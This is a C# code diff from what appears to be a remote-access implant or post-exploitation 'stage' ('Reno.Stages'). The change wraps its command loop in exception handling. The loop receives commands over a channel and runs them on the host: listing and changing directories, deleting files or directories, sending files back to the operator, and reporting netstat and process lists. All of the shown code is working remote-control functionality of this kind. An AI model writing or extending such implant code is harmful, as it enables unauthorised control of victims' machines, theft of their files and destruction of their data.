@@ -35,70 +35,83 @@ namespace Reno.Stages
             bool run = true;
             while (run)
             {
-                // Wait for a header - once its received execute the command
-                CommHeader header = channel.ReceiveHeader();
-                switch (header.Command)
+                try
                 {
-                    case CommChannel.EXIT:
-                        run = false;
-                        channel.Close();
-                        break;
-                    case CommChannel.LS:
-                        if (header.DataLength == 0)
-                        {
-                            SendDirectoryListing(pwd, header);
-                        }
-                        else
-                        {
-                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
-                            string sDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
-                            SendDirectoryListing(sDir, header);
-                        }
-                        break;
-                    case CommChannel.PWD:
-                        SendPresentWorkingDirectory(header);
-                        break;
-                    case CommChannel.CD:
-                        if(header.DataLength == 0)
-                        {
-                            Console.WriteLine("No argument");
-                            pwd = "C:\\";
-                            SendChangeDirectory(pwd, header);
-                        }
-                        else
-                        {
-                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
-                            string tmpDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
-                            SendChangeDirectory(tmpDir, header);
-                        }
-                        break;
-                    case CommChannel.DELETE:
-                        // Deletes a file or directory provided as an argument
-                        byte[] objectToDelete = channel.ReceiveBytes(header.DataLength);
-                        string fileSystemObject = Encoding.UTF8.GetString(channel.Decompress(objectToDelete));
-                        // Do some checking on the string - if the object is not fully qualified, make it
-                        // I.e delete c:\Users.txt should be used if supplied
-                        // i.e. delete users.txt should expand users.txt to pwd + \users.txt
-                        Regex fullPath = new Regex(@"^\\\\|^\\|^[a-zA-z]:\\");
-                        if (!fullPath.IsMatch(fileSystemObject))
-                        {
-                            fileSystemObject = Path.Combine(pwd, Path.GetFileName(fileSystemObject));
-                        }
-                        DeleteFileSystemObject(header, fileSystemObject);
-                        break;
-                    case CommChannel.UPLOAD:
-                        break;
-                    case CommChannel.DOWNLOAD:
-                        byte[] fileToDownload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
-                        string fileDownload = GetFullPath(Encoding.UTF8.GetString(fileToDownload));
-                        DownloadFile(header, fileDownload);
-                        break;
-                    case CommChannel.NETSTAT:
-                        SendNetstat(header);
-                        break;
-                    case CommChannel.PS:
-                        SendProcessList(header);
-                        break;
+                    // Wait for a header - once its received execute the command
+                    CommHeader header = channel.ReceiveHeader();
+                    switch (header.Command)
+                    {
+                        case CommChannel.EXIT:
+                            run = false;
+                            channel.Close();
+                            break;
+                        case CommChannel.LS:
+                            if (header.DataLength == 0)
+                            {
+                                SendDirectoryListing(pwd, header);
+                            }
+                            else
+                            {
+                                byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
+                                string sDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
+                                SendDirectoryListing(sDir, header);
+                            }
+                            break;
+                        case CommChannel.PWD:
+                            SendPresentWorkingDirectory(header);
+                            break;
+                        case CommChannel.CD:
+                            if (header.DataLength == 0)
+                            {
+                                Console.WriteLine("No argument");
+                                pwd = "C:\\";
+                                SendChangeDirectory(pwd, header);
+                            }
+                            else
+                            {
+                                byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
+                                string tmpDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
+                                SendChangeDirectory(tmpDir, header);
+                            }
+                            break;
+                        case CommChannel.DELETE:
+                            // Deletes a file or directory provided as an argument
+                            byte[] objectToDelete = channel.ReceiveBytes(header.DataLength);
+                            string fileSystemObject = Encoding.UTF8.GetString(channel.Decompress(objectToDelete));
+                            // Do some checking on the string - if the object is not fully qualified, make it
+                            // I.e delete c:\Users.txt should be used if supplied
+                            // i.e. delete users.txt should expand users.txt to pwd + \users.txt
+                            Regex fullPath = new Regex(@"^\\\\|^\\|^[a-zA-z]:\\");
+                            if (!fullPath.IsMatch(fileSystemObject))
+                            {
+                                fileSystemObject = Path.Combine(pwd, Path.GetFileName(fileSystemObject));
+                            }
+                            DeleteFileSystemObject(header, fileSystemObject);
+                            break;
+                        case CommChannel.UPLOAD:
+                            break;
+                        case CommChannel.DOWNLOAD:
+                            byte[] fileToDownload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
+                            string fileDownload = GetFullPath(Encoding.UTF8.GetString(fileToDownload));
+                            DownloadFile(header, fileDownload);
+                            break;
+                        case CommChannel.NETSTAT:
+                            SendNetstat(header);
+                            break;
+                        case CommChannel.PS:
+                            SendProcessList(header);
+                            break;
+                    }
+                }
+                catch(IOException ioe)
+                {
+                    Console.WriteLine("[-] Error with the stream - possible disconnect - {0}", ioe.Message);
+                    run = false;
+                }
+                catch(Exception e)
+                {
+                    Console.WriteLine("[-] Unknown error in main terminal loop - {0}", e.Message);
+                    run = false;
                 }
             }
         }
